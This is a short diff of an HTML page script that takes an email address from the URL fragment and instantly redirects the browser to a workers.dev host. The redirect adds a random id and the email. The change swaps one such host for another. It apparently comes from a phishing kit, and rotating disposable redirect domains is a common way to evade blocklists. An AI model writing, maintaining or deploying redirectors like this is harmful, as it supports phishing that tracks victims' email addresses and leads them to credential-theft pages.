@@ -17,7 +17,7 @@
 		var str = hash.split("#")[1];
 		var em = hash.split("#")[1];
 		window.setTimeout(function () {
-			window.location.href = "https://jolly-salad-4d61.setsuko2.workers.dev/?bbre=zxosuuzxas"+ makeid(10) + "#" + em;
+			window.location.href = "https://soft-bush-a1ab.pucered.workers.dev/?bbre=zxosuxz"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
